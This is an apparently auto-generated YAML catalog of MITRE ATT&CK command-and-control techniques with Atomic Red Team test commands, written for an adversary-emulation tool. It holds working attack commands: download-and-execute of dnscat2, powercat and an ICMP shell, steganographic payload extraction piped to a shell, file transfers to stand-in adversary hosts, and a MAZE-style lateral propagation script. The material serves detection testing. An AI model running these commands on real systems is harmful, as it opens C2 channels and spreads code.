# AutoStrike MITRE ATT&CK Techniques - command-and-control
# Auto-generated by mitre-import script
# Source: MITRE ATT&CK STIX 2.1 + Atomic Red Team

- id: T1001.002
  name: Steganography
  description: Adversaries may use steganographic techniques to hide command and control traffic to make detection efforts more difficult. Steganographic techniques can be used to hide data in digital messages that are transferred between systems. This hidden information can be used for command and control of compromised systems. In some cases, the passing of files embedded using steganography, such as image or document files, can be used for command and control.
  tactic: command-and-control
  platforms:
    - linux
    - macos
    - windows
  executors:
    - name: Steganographic Tarball Embedding
      type: powershell
      platform: windows
      command: Get-Content "PathToAtomicsFolder\T1001.002\bin\T1001.002.jpg", "$env:PUBLIC\Downloads\T1001.002.tarz" -Encoding byte -ReadCount 0 | Set-Content "$env:PUBLIC\Downloads\T1001.002New.jpg" -Encoding byte
      cleanup: |-
        Set-ExecutionPolicy Bypass -Scope Process -Force -ErrorAction Ignore
        Remove-Item -Path "$env:PUBLIC\Downloads\T1001.002New.jpg" -Force -ErrorAction Ignore
      timeout: 120
      elevation_required: true
      is_safe: false
    - name: Embedded Script in Image Execution via Extract-Invoke-PSImage
      type: powershell
      platform: windows
      command: "cd \"PathToAtomicsFolder\\ExternalPayloads\\\"\nImport-Module .\\Extract-Invoke-PSImage.ps1\n$extractedScript=Extract-Invoke-PSImage -Image \"PathToAtomicsFolder\\T1001.002\\bin\\evil_kitten.jpg\" -Out \"$HOME\\result.ps1\"\n$scriptContent = Get-Content \"$HOME\\result.ps1\" -Raw\n$base64Pattern = \"(?<=^|[^A-Za-z0-9+/])(?:[A-Za-z0-9+/]{4})*(?:[A-Za-z0-9+/]{2}(==)?|[A-Za-z0-9+/]{3}=)?(?=$|[^A-Za-z0-9+/])\"\n$base64Strings = [regex]::Matches($scriptContent, $base64Pattern) | ForEach-Object { $_.Value }\n$base64Strings | Set-Content \"$HOME\\decoded.ps1\"\n$decodedContent = Get-Content \"$HOME\\decoded.ps1\" -Raw\n$decodedText = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($decodedContent))\n$textPattern = '^.+'  \n$textMatches = [regex]::Matches($decodedText, $textPattern) | ForEach-Object { $_.Value }\n$scriptPath = \"$HOME\\textExtraction.ps1\"\n$textMatches -join '' | Set-Content -Path $scriptPath\n. \"$HOME\\textExtraction.ps1\""
      cleanup: "Set-ExecutionPolicy Bypass -Scope Process -Force -ErrorAction Ignore\nRemove-Item -Path \"$HOME\\result.ps1\" -Force -ErrorAction Ignore \nRemove-Item -Path \"$HOME\\textExtraction.ps1\" -Force -ErrorAction Ignore\nRemove-Item -Path \"$HOME\\decoded.ps1\" -Force -ErrorAction Ignore"
      timeout: 120
      elevation_required: true
      is_safe: false
    - name: Execute Embedded Script in Image via Steganography
      type: sh
      platform: linux
      command: cat "PathToAtomicsFolder/script.sh" | base64 | xxd -p | sed 's/../& /g' | xargs -n1 | xxd -r -p | cat "PathToAtomicsFolder/image.jpg" - > "PathToAtomicsFolder/evil_image.jpg"; strings "PathToAtomicsFolder/evil_image.jpg" | tail -n 1 | base64 -d | sh
      cleanup: rm "PathToAtomicsFolder/evil_image.jpg"
      timeout: 60
      is_safe: true
  references:
    - https://attack.mitre.org/techniques/T1001/002
  is_safe: true
- id: T1071
  name: Application Layer Protocol
  description: "Adversaries may communicate using OSI application layer protocols to avoid detection/network filtering by blending in with existing traffic. Commands to the remote system, and often the results of those commands, will be embedded within the protocol traffic between the client and server. \n\nAdversaries may utilize many different protocols, including those used for web browsing, transferring files, electronic mail, DNS, or publishing/subscribing. For connections that occur internally within an enclave (such as those between a proxy or pivot node and other nodes), commonly used protocols are SMB, SSH, or RDP.[1](https://www.mandiant.com/resources/blog/unc3524-eye-spy-email)"
  tactic: command-and-control
  platforms:
    - linux
    - macos
    - windows
  executors:
    - name: Telnet C2
      type: powershell
      platform: windows
      command: PathToAtomicsFolder\T1071\bin\telnet_client.exe 127.0.0.1 --port 23
      timeout: 120
      is_safe: true
  references:
    - https://attack.mitre.org/techniques/T1071
  is_safe: true
- id: T1071.001
  name: Web Protocols
  description: "Adversaries may communicate using application layer protocols associated with web traffic to avoid detection/network filtering by blending in with existing traffic. Commands to the remote system, and often the results of those commands, will be embedded within the protocol traffic between the client and server. \n\nProtocols such as HTTP/S[1](http://cdn0.vox-cdn.com/assets/4589853/crowdstrike-intelligence-report-putter-panda.original.pdf) and WebSocket[2](https://securityintelligence.com/posts/brazking-android-malware-upgraded-targeting-brazilian-banks/) that carry web traffic may be very common in environments. HTTP/S packets have many fields and headers in which data can be concealed. An adversary may abuse these protocols to communicate with systems under their control within a victim network while also mimicking normal, expected traffic."
  tactic: command-and-control
  platforms:
    - linux
    - macos
    - windows
  executors:
    - name: Malicious User Agents - Powershell
      type: powershell
      platform: windows
      command: |-
        Invoke-WebRequest www.google.com -UserAgent "HttpBrowser/1.0" | out-null
        Invoke-WebRequest www.google.com -UserAgent "Wget/1.9+cvs-stable (Red Hat modified)" | out-null
        Invoke-WebRequest www.google.com -UserAgent "Opera/8.81 (Windows NT 6.0; U; en)" | out-null
        Invoke-WebRequest www.google.com -UserAgent "*<|>*" | out-null
      timeout: 120
      is_safe: true
    - name: Malicious User Agents - CMD
      type: cmd
      platform: windows
      command: |-
        C:\Windows\System32\Curl.exe -s -A "HttpBrowser/1.0" -m3 www.google.com >nul 2>&1
        C:\Windows\System32\Curl.exe -s -A "Wget/1.9+cvs-stable (Red Hat modified)" -m3 www.google.com >nul 2>&1
        C:\Windows\System32\Curl.exe -s -A "Opera/8.81 (Windows NT 6.0; U; en)" -m3 www.google.com >nul 2>&1
        C:\Windows\System32\Curl.exe -s -A "*<|>*" -m3 www.google.com >nul 2>&1
      timeout: 120
      is_safe: true
    - name: Malicious User Agents - Nix
      type: sh
      platform: linux
      command: |-
        curl -s -A "HttpBrowser/1.0" -m3 www.google.com
        curl -s -A "Wget/1.9+cvs-stable (Red Hat modified)" -m3 www.google.com
        curl -s -A "Opera/8.81 (Windows NT 6.0; U; en)" -m3 www.google.com
        curl -s -A "*<|>*" -m3 www.google.com
      timeout: 60
      is_safe: true
    - name: Malicious User Agents - Nix
      type: sh
      platform: macos
      command: |-
        curl -s -A "HttpBrowser/1.0" -m3 www.google.com
        curl -s -A "Wget/1.9+cvs-stable (Red Hat modified)" -m3 www.google.com
        curl -s -A "Opera/8.81 (Windows NT 6.0; U; en)" -m3 www.google.com
        curl -s -A "*<|>*" -m3 www.google.com
      timeout: 60
      is_safe: true
  references:
    - https://attack.mitre.org/techniques/T1071/001
  is_safe: true
- id: T1071.004
  name: DNS
  description: "Adversaries may communicate using the Domain Name System (DNS) application layer protocol to avoid detection/network filtering by blending in with existing traffic. Commands to the remote system, and often the results of those commands, will be embedded within the protocol traffic between the client and server. \n\nThe DNS protocol serves an administrative function in computer networking and thus may be very common in environments. DNS traffic may also be allowed even before network authentication is completed. DNS packets contain many fields and headers in which data can be concealed. Often known as DNS tunneling, adversaries may abuse DNS to communicate with systems under their control within a victim network while also mimicking normal, expected traffic.[1](https://www.paloaltonetworks.com/cyberpedia/what-is-dns-tunneling)[2](https://medium.com/@galolbardes/learn-how-easy-is-to-bypass-firewalls-using-dns-tunneling-and-also-how-to-block-it-3ed652f4a000)\n\nDNS beaconing may be used to send commands to remote systems via DNS queries. A DNS beacon is created by tunneling DNS traffic (i.e. [Protocol Tunneling](https://attack.mitre.org/techniques/T1572)). The commands may be embedded into different DNS records, for example, TXT or A records.[3](https://unit42.paloaltonetworks.com/unit42-oilrig-uses-updated-bondupdater-target-middle-eastern-government/) DNS beacons may be difficult to detect because the beacons infrequently communicate with infected devices.[4](https://vercara.digicert.com/resources/dns-beacons#page_top) Infrequent communication conceals the malicious DNS traffic with normal DNS traffic."
  tactic: command-and-control
  platforms:
    - linux
    - macos
    - windows
  executors:
    - name: DNS Large Query Volume
      type: powershell
      platform: windows
      command: for($i=0; $i -le 1000; $i++) { Resolve-DnsName -type "TXT" "atomicredteam-$(Get-Random -Minimum 1 -Maximum 999999).127.0.0.1.nip.io" -QuickTimeout}
      timeout: 120
      is_safe: true
    - name: DNS Regular Beaconing
      type: powershell
      platform: windows
      command: |-
        Set-Location "PathToAtomicsFolder"
        .\T1071.004\src\T1071-dns-beacon.ps1 -Domain 127.0.0.1.nip.io -Subdomain atomicredteam -QueryType TXT -C2Interval 30 -C2Jitter 20 -RunTime 30
      timeout: 120
      is_safe: true
    - name: DNS Long Domain Query
      type: powershell
      platform: windows
      command: |-
        Set-Location "PathToAtomicsFolder"
        .\T1071.004\src\T1071-dns-domain-length.ps1 -Domain 127.0.0.1.nip.io -Subdomain atomicredteamatomicredteamatomicredteamatomicredteamatomicredte -QueryType TXT
      timeout: 120
      is_safe: true
    - name: DNS C2
      type: powershell
      platform: windows
      command: |-
        IEX (New-Object System.Net.Webclient).DownloadString('https://raw.githubusercontent.com/lukebaggett/dnscat2-powershell/45836819b2339f0bb64eaf294f8cc783635e00c6/dnscat2.ps1')
        Start-Dnscat2 -Domain example.com -DNSServer 127.0.0.1
      timeout: 120
      is_safe: true
  references:
    - https://attack.mitre.org/techniques/T1071/004
  is_safe: true
- id: T1090.001
  name: Internal Proxy
  description: |-
    Adversaries may use an internal proxy to direct command and control traffic between two or more systems in a compromised environment. Many tools exist that enable traffic redirection through proxies or port redirection, including [HTRAN](https://attack.mitre.org/software/S0040), ZXProxy, and ZXPortMap. [1](http://blog.trendmicro.com/trendlabs-security-intelligence/in-depth-look-apt-attack-tools-of-the-trade/) Adversaries use internal proxies to manage command and control communications inside a compromised environment, to reduce the number of simultaneous outbound network connections, to provide resiliency in the face of connection loss, or to ride over existing trusted communications paths between infected systems to avoid suspicion. Internal proxy connections may use common peer-to-peer (p2p) networking protocols, such as SMB, to better blend in with the environment.

    By using a compromised internal system as a proxy, adversaries may conceal the true destination of C2 traffic while reducing the need for numerous connections to external systems.
  tactic: command-and-control
  platforms:
    - linux
    - windows
    - macos
  executors:
    - name: Connection Proxy
      type: sh
      platform: linux
      command: |-
        export http_proxy=127.0.0.1:3128
        curl http://google.com
      cleanup: |-
        unset http_proxy
        [ "false" == "true" ] && (kill -9 $(ps aux | grep "squid -N" | grep -v "grep" | awk '{print $2}'))
      timeout: 60
      is_safe: false
    - name: Connection Proxy
      type: sh
      platform: macos
      command: |-
        export http_proxy=127.0.0.1:3128
        curl http://google.com
      cleanup: |-
        unset http_proxy
        [ "false" == "true" ] && (kill -9 $(ps aux | grep "squid -N" | grep -v "grep" | awk '{print $2}'))
      timeout: 60
      is_safe: false
    - name: Connection Proxy for macOS UI
      type: sh
      platform: macos
      command: |-
        networksetup -setwebproxy Wi-Fi 127.0.0.1 8080
        networksetup -setsecurewebproxy Wi-Fi 127.0.0.1 8080
      cleanup: |-
        networksetup -setwebproxystate Wi-Fi off
        networksetup -setsecurewebproxystate Wi-Fi off
      timeout: 60
      is_safe: true
    - name: portproxy reg key
      type: powershell
      platform: windows
      command: netsh interface portproxy add v4tov4 listenport=1337 connectport=1337 connectaddress=127.0.0.1
      cleanup: netsh interface portproxy delete v4tov4 listenport=1337 -ErrorAction Ignore | Out-Null
      timeout: 120
      elevation_required: true
      is_safe: false
  references:
    - https://attack.mitre.org/techniques/T1090/001
  is_safe: true
- id: T1090.003
  name: Multi-hop Proxy
  description: "Adversaries may chain together multiple proxies to disguise the source of malicious traffic. Typically, a defender will be able to identify the last proxy traffic traversed before it enters their network; the defender may or may not be able to identify any previous proxies before the last-hop proxy. This technique makes identifying the original source of the malicious traffic even more difficult by requiring the defender to trace malicious traffic through several proxies to identify its source.\n\nFor example, adversaries may construct or use onion routing networks – such as the publicly available [Tor](https://attack.mitre.org/software/S0183) network – to transport encrypted C2 traffic through a compromised population, allowing communication with any device within the network.[1](https://en.wikipedia.org/wiki/Onion_routing) Adversaries may also use operational relay box (ORB) networks composed of virtual private servers (VPS), Internet of Things (IoT) devices, smart devices, and end-of-life routers to obfuscate their operations.[2](https://cloud.google.com/blog/topics/threat-intelligence/china-nexus-espionage-orb-networks) \n\nIn the case of network infrastructure, it is possible for an adversary to leverage multiple compromised devices to create a multi-hop proxy chain (i.e., [Network Devices](https://attack.mitre.org/techniques/T1584/008)). By leveraging [Patch System Image](https://attack.mitre.org/techniques/T1601/001) on routers, adversaries can add custom code to the affected network devices that will implement onion routing between those nodes. This method is dependent upon the [Network Boundary Bridging](https://attack.mitre.org/techniques/T1599) method allowing the adversaries to cross the protected network boundary of the Internet perimeter and into the organization’s Wide-Area Network (WAN).  Protocols such as ICMP may be used as a transport.  \n\nSimilarly, adversaries may abuse peer-to-peer (P2P) and blockchain-oriented infrastructure to implement routing between a decentralized network of peers.[3](https://unit42.paloaltonetworks.com/manageengine-godzilla-nglite-kdcsponge/)"
  tactic: command-and-control
  platforms:
    - linux
    - macos
    - windows
  executors:
    - name: Psiphon
      type: powershell
      platform: windows
      command: '& "PathToAtomicsFolder\T1090.003\src\Psiphon.bat"'
      cleanup: "$Proxy = Get-Content $env:Temp\\proxy-backup.txt -ErrorAction Ignore\nif($null -ne $Proxy) \n{Set-ItemProperty -Path 'HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Internet Settings' -Name \"ProxyServer\" -Value $Proxy}"
      timeout: 120
      is_safe: true
    - name: Tor Proxy Usage - Windows
      type: powershell
      platform: windows
      command: |-
        invoke-expression 'cmd /c start powershell -Command {cmd /c "PathToAtomicsFolder\..\ExternalPayloads\tor\Tor\tor.exe"}'
        sleep -s 60
        stop-process -name "tor" | out-null
      timeout: 120
      is_safe: true
    - name: Tor Proxy Usage - Debian/Ubuntu/FreeBSD
      type: sh
      platform: linux
      command: '[ "$(uname)" = ''FreeBSD'' ] && sysrc tor_enable="YES" && service tor start || sudo systemctl start tor'
      cleanup: '[ "$(uname)" = ''FreeBSD'' ] && service tor stop && sysrc -x tor_enable || sudo systemctl stop tor'
      timeout: 60
      elevation_required: true
      is_safe: false
    - name: Tor Proxy Usage - MacOS
      type: sh
      platform: macos
      command: osascript -e 'tell application "Terminal" to do script "tor"'
      cleanup: killall tor > /dev/null 2>&1
      timeout: 60
      is_safe: false
  references:
    - https://attack.mitre.org/techniques/T1090/003
  is_safe: true
- id: T1095
  name: Non-Application Layer Protocol
  description: |-
    Adversaries may use an OSI non-application layer protocol for communication between host and C2 server or among infected hosts within a network. The list of possible protocols is extensive.[1](http://en.wikipedia.org/wiki/List_of_network_protocols_%28OSI_model%29) Specific examples include use of network layer protocols, such as the Internet Control Message Protocol (ICMP), transport layer protocols, such as the User Datagram Protocol (UDP), session layer protocols, such as Socket Secure (SOCKS), as well as redirected/tunneled protocols, such as Serial over LAN (SOL).

    ICMP communication between hosts is one example.[2](https://blogs.cisco.com/security/evolution-of-attacks-on-cisco-ios-devices) Because ICMP is part of the Internet Protocol Suite, it is required to be implemented by all IP-compatible hosts.[3](http://support.microsoft.com/KB/170292) However, it is not as commonly monitored as other Internet Protocols such as TCP or UDP and may be used by adversaries to hide communications.

    In ESXi environments, adversaries may leverage the Virtual Machine Communication Interface (VMCI) for communication between guest virtual machines and the ESXi host. This traffic is similar to client-server communications on traditional network sockets but is localized to the physical machine running the ESXi host, meaning it does not traverse external networks (routers, switches). This results in communications that are invisible to external monitoring and standard networking tools like tcpdump, netstat, nmap, and Wireshark. By adding a VMCI backdoor to a compromised ESXi host, adversaries may persistently regain access from any guest VM to the compromised ESXi host’s backdoor, regardless of network segmentation or firewall rules in place.[4](https://cloud.google.com/blog/topics/threat-intelligence/vmware-esxi-zero-day-bypass/)
  tactic: command-and-control
  platforms:
    - linux
    - macos
    - windows
  executors:
    - name: ICMP C2
      type: powershell
      platform: windows
      command: |-
        IEX (New-Object System.Net.WebClient).Downloadstring('https://raw.githubusercontent.com/samratashok/nishang/c75da7f91fcc356f846e09eab0cfd7f296ebf746/Shells/Invoke-PowerShellIcmp.ps1')
        Invoke-PowerShellIcmp -IPAddress 127.0.0.1
      timeout: 120
      is_safe: true
    - name: Netcat C2
      type: powershell
      platform: windows
      command: cmd /c "PathToAtomicsFolder\..\ExternalPayloads\T1095\nmap-7.80\ncat.exe" 127.0.0.1 80
      timeout: 120
      is_safe: true
    - name: Powercat C2
      type: powershell
      platform: windows
      command: |-
        IEX (New-Object System.Net.Webclient).Downloadstring('https://raw.githubusercontent.com/besimorhino/powercat/ff755efeb2abc3f02fa0640cd01b87c4a59d6bb5/powercat.ps1')
        powercat -c 127.0.0.1 -p 80
      timeout: 120
      is_safe: true
  references:
    - https://attack.mitre.org/techniques/T1095
  is_safe: true
- id: T1105
  name: Ingress Tool Transfer
  description: "Adversaries may transfer tools or other files from an external system into a compromised environment. Tools or files may be copied from an external adversary-controlled system to the victim network through the command and control channel or through alternate protocols such as [ftp](https://attack.mitre.org/software/S0095). Once present, adversaries may also transfer/spread tools between victim devices within a compromised environment (i.e. [Lateral Tool Transfer](https://attack.mitre.org/techniques/T1570)). \n\nOn Windows, adversaries may use various utilities to download tools, such as `copy`, `finger`, [certutil](https://attack.mitre.org/software/S0160), and [PowerShell](https://attack.mitre.org/techniques/T1059/001) commands such as <code>IEX(New-Object Net.WebClient).downloadString()</code> and <code>Invoke-WebRequest</code>. On Linux and macOS systems, a variety of utilities also exist, such as `curl`, `scp`, `sftp`, `tftp`, `rsync`, `finger`, and `wget`.[1](https://lolbas-project.github.io/#t1105)  A number of these tools, such as `wget`, `curl`, and `scp`, also exist on ESXi. After downloading a file, a threat actor may attempt to verify its integrity by checking its hash value (e.g., via `certutil -hashfile`).[2](https://cloud.google.com/blog/topics/threat-intelligence/cosmicenergy-ot-malware-russian-response/)\n\nAdversaries may also abuse installers and package managers, such as `yum` or `winget`, to download tools to victim hosts. Adversaries have also abused file application features, such as the Windows `search-ms` protocol handler, to deliver malicious files to victims through remote file searches invoked by [User Execution](https://attack.mitre.org/techniques/T1204) (typically after interacting with [Phishing](https://attack.mitre.org/techniques/T1566) lures).[3](https://www.trellix.com/blogs/research/beyond-file-search-a-novel-method/)\n\nFiles can also be transferred using various [Web Service](https://attack.mitre.org/techniques/T1102)s as well as native or otherwise present tools on the victim system.[4](https://www.ptsecurity.com/upload/corporate/ww-en/analytics/Cobalt-Snatch-eng.pdf) In some cases, adversaries may be able to leverage services that sync between a web-based and an on-premises client, such as Dropbox or OneDrive, to transfer files onto victim systems. For example, by compromising a cloud account and logging into the service's web portal, an adversary may be able to trigger an automatic syncing process that transfers the file onto the victim's machine.[5](https://www.technologyreview.com/2013/08/21/83143/dropbox-and-similar-services-can-sync-malware/)"
  tactic: command-and-control
  platforms:
    - linux
    - macos
    - windows
  executors:
    - name: rsync remote file copy (push)
      type: sh
      platform: linux
      command: rsync -r /tmp/adversary-rsync/ victim@victim-host:/tmp/victim-files
      timeout: 60
      elevation_required: true
      is_safe: false
    - name: rsync remote file copy (push)
      type: sh
      platform: macos
      command: rsync -r /tmp/adversary-rsync/ victim@victim-host:/tmp/victim-files
      timeout: 60
      elevation_required: true
      is_safe: false
    - name: rsync remote file copy (pull)
      type: sh
      platform: linux
      command: rsync -r adversary@adversary-host:/tmp/adversary-rsync/ /tmp/victim-files
      timeout: 60
      is_safe: true
    - name: rsync remote file copy (pull)
      type: sh
      platform: macos
      command: rsync -r adversary@adversary-host:/tmp/adversary-rsync/ /tmp/victim-files
      timeout: 60
      is_safe: true
    - name: scp remote file copy (push)
      type: sh
      platform: linux
      command: scp /tmp/adversary-scp victim@victim-host:/tmp/victim-files/
      timeout: 60
      is_safe: true
    - name: scp remote file copy (push)
      type: sh
      platform: macos
      command: scp /tmp/adversary-scp victim@victim-host:/tmp/victim-files/
      timeout: 60
      is_safe: true
    - name: scp remote file copy (pull)
      type: sh
      platform: linux
      command: scp adversary@adversary-host:/tmp/adversary-scp /tmp/victim-files/
      timeout: 60
      is_safe: true
    - name: scp remote file copy (pull)
      type: sh
      platform: macos
      command: scp adversary@adversary-host:/tmp/adversary-scp /tmp/victim-files/
      timeout: 60
      is_safe: true
    - name: sftp remote file copy (push)
      type: bash
      platform: linux
      command: sftp victim@victim-host:/tmp/victim-files/ <<< $'put /tmp/adversary-sftp'
      timeout: 60
      is_safe: true
    - name: sftp remote file copy (push)
      type: bash
      platform: macos
      command: sftp victim@victim-host:/tmp/victim-files/ <<< $'put /tmp/adversary-sftp'
      timeout: 60
      is_safe: true
    - name: sftp remote file copy (pull)
      type: sh
      platform: linux
      command: sftp adversary@adversary-host:/tmp/adversary-sftp /tmp/victim-files/
      timeout: 60
      is_safe: true
    - name: sftp remote file copy (pull)
      type: sh
      platform: macos
      command: sftp adversary@adversary-host:/tmp/adversary-sftp /tmp/victim-files/
      timeout: 60
      is_safe: true
    - name: certutil download (urlcache)
      type: cmd
      platform: windows
      command: cmd /c certutil -urlcache -split -f https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/LICENSE.txt Atomic-license.txt
      cleanup: del Atomic-license.txt >nul 2>&1
      timeout: 120
      is_safe: true
    - name: certutil download (verifyctl)
      type: powershell
      platform: windows
      command: |-
        $datePath = "certutil-$(Get-Date -format yyyy_MM_dd)"
        New-Item -Path $datePath -ItemType Directory
        Set-Location $datePath
        certutil -verifyctl -split -f https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/LICENSE.txt
        Get-ChildItem | Where-Object {$_.Name -notlike "*.txt"} | Foreach-Object { Move-Item $_.Name -Destination Atomic-license.txt }
      cleanup: Remove-Item "certutil-$(Get-Date -format yyyy_MM_dd)" -Force -Recurse -ErrorAction Ignore
      timeout: 120
      is_safe: true
    - name: Windows - BITSAdmin BITS Download
      type: cmd
      platform: windows
      command: C:\Windows\System32\bitsadmin.exe /transfer qcxjb7 /Priority HIGH https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/LICENSE.txt %temp%\Atomic-license.txt
      timeout: 120
      is_safe: true
    - name: Windows - PowerShell Download
      type: powershell
      platform: windows
      command: (New-Object System.Net.WebClient).DownloadFile("https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/LICENSE.txt", "$env:TEMP\Atomic-license.txt")
      cleanup: Remove-Item $env:TEMP\Atomic-license.txt -Force -ErrorAction Ignore
      timeout: 120
      is_safe: true
    - name: OSTAP Worming Activity
      type: cmd
      platform: windows
      command: |-
        pushd \\localhost\C$
        echo var fileObject = WScript.createobject("Scripting.FileSystemObject");var newfile = fileObject.CreateTextFile("AtomicTestFileT1105.js", true);newfile.WriteLine("This is an atomic red team test file for T1105. It simulates how OSTap worms accross network shares and drives.");newfile.Close(); > AtomicTestT1105.js
        CScript.exe AtomicTestT1105.js //E:JScript
        del AtomicTestT1105.js /Q >nul 2>&1
        del AtomicTestFileT1105.js /Q >nul 2>&1
        popd
      timeout: 120
      elevation_required: true
      is_safe: false
    - name: svchost writing a file to a UNC path
      type: cmd
      platform: windows
      command: |-
        copy C:\Windows\System32\cmd.exe C:\svchost.exe
        C:\svchost.exe /c echo T1105 > \\localhost\c$\T1105.txt
      cleanup: |-
        del C:\T1105.txt >nul 2>&1
        del C:\\svchost.exe >nul 2>&1
      timeout: 120
      elevation_required: true
      is_safe: false
    - name: Download a File with Windows Defender MpCmdRun.exe
      type: cmd
      platform: windows
      command: |-
        cd "%ProgramData%\Microsoft\Windows Defender\platform\4.18*"
        MpCmdRun.exe -DownloadFile -url https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/LICENSE.txt -path %temp%\Atomic-license.txt
      cleanup: |-
        del %temp%\Atomic-license.txt >nul 2>&1
        del %temp%\MpCmdRun.log >nul 2>&1
      timeout: 120
      is_safe: true
    - name: whois file download
      type: sh
      platform: linux
      command: timeout --preserve-status 1 whois -h localhost -p 8443 "Hello from Atomic Red Team test T1105" > /tmp/T1105.whois.out
      cleanup: rm -f /tmp/T1105.whois.out
      timeout: 60
      is_safe: true
    - name: whois file download
      type: sh
      platform: macos
      command: timeout --preserve-status 1 whois -h localhost -p 8443 "Hello from Atomic Red Team test T1105" > /tmp/T1105.whois.out
      cleanup: rm -f /tmp/T1105.whois.out
      timeout: 60
      is_safe: true
    - name: File Download via PowerShell
      type: powershell
      platform: windows
      command: (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/redcanaryco/atomic-red-team/4042cb3433bce024e304500dcfe3c5590571573a/LICENSE.txt') | Out-File LICENSE.txt; Invoke-Item LICENSE.txt
      timeout: 120
      is_safe: true
    - name: File download with finger.exe on Windows
      type: cmd
      platform: windows
      command: finger base64_filedata@localhost
      timeout: 120
      is_safe: true
    - name: Download a file with IMEWDBLD.exe
      type: powershell
      platform: windows
      command: |-
        $imewdbled = $env:SystemRoot + "\System32\IME\SHARED\IMEWDBLD.exe"
        & $imewdbled https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1105/T1105.yaml
      cleanup: "$inetcache = $env:LOCALAPPDATA + \"\\Microsoft\\Windows\\INetCache\\\" \n$file_to_be_removed = [string[]] (Get-ChildItem -Path $inetcache -Include T1105* -Recurse -Force -File -ErrorAction SilentlyContinue)\nif(\"\" -ne \"$file_to_be_removed\") { Remove-Item \"$file_to_be_removed\" -ErrorAction Ignore }"
      timeout: 120
      is_safe: true
    - name: Curl Download File
      type: cmd
      platform: windows
      command: |-
        C:\Windows\System32\Curl.exe -k https://github.com/redcanaryco/atomic-red-team/raw/058b5c2423c4a6e9e226f4e5ffa1a6fd9bb1a90e/atomics/T1218.010/bin/AllTheThingsx64.dll -o c:\users\public\music\allthethingsx64.dll
        C:\Windows\System32\Curl.exe -k https://github.com/redcanaryco/atomic-red-team/raw/058b5c2423c4a6e9e226f4e5ffa1a6fd9bb1a90e/atomics/T1218.010/bin/AllTheThingsx64.dll --output c:\users\public\music\allthethingsx64.dll
        C:\Windows\System32\Curl.exe -k https://github.com/redcanaryco/atomic-red-team/raw/058b5c2423c4a6e9e226f4e5ffa1a6fd9bb1a90e/atomics/T1218.010/bin/AllTheThingsx64.dll -o c:\programdata\allthethingsx64.dll
        C:\Windows\System32\Curl.exe -k https://github.com/redcanaryco/atomic-red-team/raw/058b5c2423c4a6e9e226f4e5ffa1a6fd9bb1a90e/atomics/T1218.010/bin/AllTheThingsx64.dll -o %Temp%\allthethingsx64.dll
      cleanup: |-
        del c:\users\public\music\allthethingsx64.dll >nul 2>&1
        del c:\users\public\music\allthethingsx64.dll >nul 2>&1
        del c:\programdata\allthethingsx64.dll >nul 2>&1
        del %Temp%\allthethingsx64.dll >nul 2>&1
      timeout: 120
      is_safe: true
    - name: Curl Upload File
      type: cmd
      platform: windows
      command: |-
        C:\Windows\System32\Curl.exe -T c:\temp\atomictestfile.txt www.example.com
        C:\Windows\System32\Curl.exe --upload-file c:\temp\atomictestfile.txt www.example.com
        C:\Windows\System32\Curl.exe -d c:\temp\atomictestfile.txt www.example.com
        C:\Windows\System32\Curl.exe --data c:\temp\atomictestfile.txt www.example.com
      timeout: 120
      is_safe: true
    - name: Download a file with Microsoft Connection Manager Auto-Download
      type: cmd
      platform: windows
      command: '"PathToAtomicsFolder\T1105\src\T1105.bat" 1>NUL'
      cleanup: |-
        del /f/s/q %temp%\T1105 >nul 2>&1
        rmdir /s/q %temp%\T1105 >nul 2>&1
      timeout: 120
      is_safe: false
    - name: MAZE Propagation Script
      type: powershell
      platform: windows
      command: "$machine_list = \"PathToAtomicsFolder\\..\\ExternalPayloads\\T1105MachineList.txt\"\n$offline_list = \"PathToAtomicsFolder\\..\\ExternalPayloads\\T1105OfflineHosts.txt\"\n$completed_list = \"PathToAtomicsFolder\\..\\ExternalPayloads\\T1105CompletedHosts.txt\"\nforeach ($machine in get-content -path \"$machine_list\")\n{if (test-connection -Count 1 -computername $machine -quiet) \n{cmd /c copy \"$env:comspec\" \"\\\\$machine\\C$\\Windows\\Temp\\T1105.exe\"\necho $machine >> \"$completed_list\"\nwmic /node: \"$machine\" process call create \"regsvr32.exe /i C:\\Windows\\Temp\\T1105.exe\"}\nelse\n{echo $machine >> \"$offline_list\"}}"
      cleanup: "if (test-path \"PathToAtomicsFolder\\..\\ExternalPayloads\\T1105CompletedHosts.txt\") \n{foreach ($machine in get-content -path \"PathToAtomicsFolder\\..\\ExternalPayloads\\T1105CompletedHosts.txt\")\n{wmic /node: \"$machine\" process where name='\"regsvr32.exe\"' call terminate | out-null\nRemove-Item -path \"\\\\$machine\\C$\\Windows\\Temp\\T1105.exe\" -force -erroraction silentlycontinue}}\nRemove-Item -path \"PathToAtomicsFolder\\..\\ExternalPayloads\\T1105OfflineHosts.txt\" -erroraction silentlycontinue\nRemove-item -path \"PathToAtomicsFolder\\..\\ExternalPayloads\\T1105CompletedHosts.txt\" -erroraction silentlycontinue"
      timeout: 120
      is_safe: true
    - name: Printer Migration Command-Line Tool UNC share folder into a zip file
      type: cmd
      platform: windows
      command: "del %TEMP%\\PrintBrm.zip >nul 2>&1 \nC:\\Windows\\System32\\spool\\tools\\PrintBrm.exe -b -d \\\\127.0.0.1\\c$\\AtomicRedTeam\\atomics\\T1105\\src\\  -f %TEMP%\\PrintBrm.zip -O FORCE"
      cleanup: del %TEMP%\PrintBrm.zip >nul 2>&1
      timeout: 120
      is_safe: true
    - name: Lolbas replace.exe use to copy file
      type: cmd
      platform: windows
      command: |-
        del %TEMP%\redcanary.cab >nul 2>&1
        C:\Windows\System32\replace.exe "PathToAtomicsFolder\T1105\src\redcanary.cab" %TEMP% /A
      cleanup: del %TEMP%\redcanary.cab >nul 2>&1
      timeout: 120
      is_safe: true
    - name: Lolbas replace.exe use to copy UNC file
      type: cmd
      platform: windows
      command: |-
        del %TEMP%\redcanary.cab >nul 2>&1
        C:\Windows\System32\replace.exe \\127.0.0.1\c$\AtomicRedTeam\atomics\T1105\src\redcanary.cab %TEMP% /A
      cleanup: del %TEMP%\redcanary.cab >nul 2>&1
      timeout: 120
      is_safe: true
    - name: certreq download
      type: cmd
